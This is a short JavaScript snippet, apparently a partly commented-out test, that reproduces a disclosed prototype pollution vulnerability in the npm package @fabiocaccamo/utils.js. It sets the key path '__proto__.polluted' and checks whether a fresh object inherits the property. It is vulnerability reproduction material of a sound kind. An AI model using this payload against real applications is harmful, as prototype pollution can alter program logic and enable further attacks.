// //https://security.snyk.io/vuln/SNYK-JS-FABIOCACCAMOUTILSJS-1932614
// test("prototype pollution in @fabiocaccamo/utils.js", () => {
  const utils = require("@fabiocaccamo/utils.js");
  const obj = {};

console.log({}.polluted);

  utils.object.keypath.set(obj, "__proto__.polluted", "yes");
console.log({}.polluted);
// });
